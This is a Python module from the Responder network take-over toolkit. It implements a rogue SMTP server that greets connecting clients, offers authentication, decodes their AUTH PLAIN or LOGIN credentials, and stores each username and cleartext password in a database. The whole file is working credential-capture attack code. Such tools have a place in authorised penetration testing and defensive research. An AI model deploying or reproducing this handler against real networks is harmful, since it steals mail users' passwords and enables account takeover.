#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings
from base64 import b64decode

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler
from responder.src.packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2


class ESMTP(BaseRequestHandler):

    def handle(self):
        try:
            self.request.send(NetworkSendBufferPython2or3(SMTPGreeting()))
            data = self.request.recv(1024)

            if data[0:4] == b"EHLO" or data[0:4] == b"ehlo":
                self.request.send(NetworkSendBufferPython2or3(SMTPAUTH()))
                data = self.request.recv(1024)

            if data[0:4] == b"AUTH":
                AuthPlain = re.findall(b"(?<=AUTH PLAIN )[^\r]*", data)
                if AuthPlain:
                    User = list(filter(None, b64decode(AuthPlain[0]).split(b"\x00")))
                    Username = User[0].decode("latin-1")
                    Password = User[1].decode("latin-1")

                    SaveToDb(
                        {
                            "module": "SMTP",
                            "type": "Cleartext",
                            "client": self.client_address[0],
                            "user": Username,
                            "cleartext": Password,
                            "fullhash": Username + ":" + Password,
                        }
                    )

                else:
                    self.request.send(NetworkSendBufferPython2or3(SMTPAUTH1()))
                    data = self.request.recv(1024)

                    if data:
                        try:
                            User = list(filter(None, b64decode(data).split(b"\x00")))
                            Username = User[0].decode("latin-1")
                            Password = User[1].decode("latin-1")
                        except:
                            Username = b64decode(data).decode("latin-1")

                            self.request.send(NetworkSendBufferPython2or3(SMTPAUTH2()))
                            data = self.request.recv(1024)

                            if data:
                                try:
                                    Password = b64decode(data).decode("latin-1")
                                except:
                                    Password = data

                        SaveToDb(
                            {
                                "module": "SMTP",
                                "type": "Cleartext",
                                "client": self.client_address[0],
                                "user": Username,
                                "cleartext": Password,
                                "fullhash": Username + ":" + Password,
                            }
                        )

        except Exception:
            pass
